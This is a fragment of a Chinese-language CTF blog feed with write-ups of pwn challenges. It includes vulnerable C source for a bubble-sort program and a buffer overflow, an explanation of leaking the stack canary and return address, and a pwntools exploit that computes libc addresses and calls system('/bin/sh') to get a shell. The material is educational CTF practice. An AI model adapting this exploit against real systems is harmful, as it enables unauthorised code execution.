class="built_in">puts</span>(<span class="string">"Processing......"</span>);</span><br><span class="line">		fflush(<span class="built_in">stdout</span>);</span><br><span class="line">		sleep(<span class="number">1</span>);</span><br><span class="line">		<span class="keyword">for</span>(i = n ; i &gt; <span class="number">0</span> ; i--)&#123;</span><br><span class="line">			<span class="keyword">for</span>( j = <span class="number">0</span> ; j &lt; i ; j++)&#123;</span><br><span class="line">				<span class="keyword">if</span>(buf[j] &gt; buf[j+<span class="number">1</span>])&#123;</span><br><span class="line">					tmp = buf[j] ;</span><br><span class="line">					buf[j] = buf[j+<span class="number">1</span>];</span><br><span class="line">					buf[j+<span class="number">1</span>] = tmp ;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">"Result :"</span>);</span><br><span class="line">		fflush(<span class="built_in">stdout</span>);</span><br><span class="line">		<span class="keyword">for</span>(i = <span class="number">0</span> ; i &lt; n ; i++)&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"%u "</span>,buf[i]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">""</span>);</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">"Continue (yes:1,no:0) ?"</span>);</span><br><span class="line">		fflush(<span class="built_in">stdout</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">"%u"</span>,&amp;tmp);</span><br><span class="line">		<span class="keyword">if</span>(tmp != <span class="number">1</span>)&#123;</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">"Thank you ~"</span>);</span><br><span class="line">			fflush(<span class="built_in">stdout</span>);</span><br><span class="line">			<span class="keyword">break</span> ;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="u89E3_u984C_u601D_u8DEF-6"><a href="#u89E3_u984C_u601D_u8DEF-6" class="headerlink" title="解題思路"></a>解題思路</h3><p>首先，這題有DEP、StackGuard<br>這題看似單純的bubble sort，實際上交換的部分有bug<br>他有可能拿buf以外的值來做判斷、交換<br>所以只要塞小一點的值，就可以把後面想leak的memory內容排序到前面<br>然後我們要做的就是去Leak canary和main return address<br>⽤gdb動態分析⼀下就能找出canary和main return address的位址在stack中的位置，再來就是構造出能夠讓canary和return address被排到前面的序列，首先我們需要夠⼤的數字(要⼤於我們想leak的內容)，這裏我是塞-1</p>
<p>第一輪先塞8個-1，則canary值會因為⼩於-1(約4294967295)，排序到最前面，故可取得canary值<br>第二輪塞16個9999999900，return address因為⼩於9999999900，被排序到最前面<br>第三輪塞20個9999999999 防止排序搗亂我們<br>第四輪塞17個0,再塞2個/bin/sh位址 (其實只需塞最後一個即可，但為了防止排序搗亂所以塞兩個)<br>最後一輪塞8個0、3個canary、6個system位址，即可拿到shell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">remote r = remote(<span class="string">'140.115.53.13'</span>, <span class="number">31337</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># STEP 1</span></span><br><span class="line">r.send(<span class="string">"8\n"</span> + <span class="string">"-1\n"</span>*<span class="number">8</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">str = r.recvline()</span><br><span class="line">canary = (str[:<span class="number">10</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"*"</span>*<span class="number">10</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"canary = "</span>, canary</span><br><span class="line"><span class="keyword">print</span> <span class="string">"*"</span>*<span class="number">10</span></span><br><span class="line"></span><br><span class="line">r.send(<span class="string">"1\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># STEP 2</span></span><br><span class="line">r.recvuntil(<span class="string">'How many numbers do you have ?'</span>)</span><br><span class="line">r.send(<span class="string">"16\n"</span> + <span class="string">"9999999900\n"</span> * <span class="number">16</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">str = r.recvline()</span><br><span class="line">ret = str[:<span class="number">10</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"*"</span>*<span class="number">10</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"ret = "</span>, ret</span><br><span class="line"><span class="keyword">print</span> <span class="string">"*"</span>*<span class="number">10</span></span><br><span class="line">r.send(<span class="string">"1\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># STEP 3</span></span><br><span class="line">r.recvuntil(<span class="string">'How many numbers do you have ?'</span>)</span><br><span class="line">r.send(<span class="string">"20\n"</span> + <span class="string">"9999999999\n"</span> * <span class="number">20</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">str = r.recvline()</span><br><span class="line">r.send(<span class="string">"1\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Address</span></span><br><span class="line">base = int(ret) - <span class="number">0x19a63</span></span><br><span class="line">sh = (base + <span class="number">0x15da84</span>).__str__()</span><br><span class="line">system = (base + <span class="number">0x3fcd0</span>).__str__()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"base = "</span>, base</span><br><span class="line"><span class="keyword">print</span> <span class="string">"sh = "</span>, sh</span><br><span class="line"><span class="keyword">print</span> <span class="string">"systen = "</span>, system</span><br><span class="line"></span><br><span class="line"><span class="comment"># STEP 4</span></span><br><span class="line">r.recvuntil(<span class="string">'How many numbers do you have ?'</span>)</span><br><span class="line">r.send(<span class="string">"19\n"</span> + <span class="string">"0\n"</span> * <span class="number">17</span> + (sh + <span class="string">"\n"</span>) * <span class="number">2</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">str = r.recvline()</span><br><span class="line">r.send(<span class="string">"1\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># STEP 5</span></span><br><span class="line">r.recvuntil(<span class="string">'How many numbers do you have ?'</span>)</span><br><span class="line">r.send(<span class="string">"17\n"</span> + <span class="string">"0\n"</span> * <span class="number">8</span> + (canary + <span class="string">"\n"</span>) * <span class="number">3</span> + (system + <span class="string">"\n"</span>) * <span class="number">6</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">str = r.recvline()</span><br><span class="line">r.send(<span class="string">"0\n"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="u7B2C_u4E00_u984C_uFF1ABOF_easy__5B_pwn__5D"><a href="#u7B2C_u4E00_u984C_uFF1ABOF_easy__5B_pwn__5D" class="headerlink" title="第一題：BOF easy [ pwn ]"></a>第一題：BOF easy [ pwn ]</h2><h3 id="u984C_u76EE"><a href="#u984C_u76EE" class="headerlink" title="題目"></a>題目</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">l33t</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Congrat !!Congrat"</span>);</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">20</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Buffer overerflow is easy"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Read your input :"</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    read(fflush0,buf,<span class="number">100</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="u89E3_u984C_u601D_u8DEF"><a href="#u89E3_u984C_u601D_u8DEF" class="headerlink" title="解題思路"></a>解題思路</h3><p>l33t()中有system(“/bin/sh”)，所以目標就是執行l33t()<br>由code可知buf長度20，但read()讀100個bytes，代表這裡可以buffer overflow<br>並且這題沒有ASLR，所以用objdump可以找出l33t()的address為0x80484fd<br>接著，只需要將main()的return address蓋成0x80484fd即可<br>payload:<br>]]>
    
    </summary>
    
      <category term="CTF" scheme="http://w181496.twbbs.org/tags/CTF/"/>
    
      <category term="NCU" scheme="http://w181496.twbbs.org/tags/NCU/"/>
    
      <category term="筆記" scheme="http://w181496.twbbs.org/tags/%E7%AD%86%E8%A8%98/"/>
    
  </entry>
  
</feed>
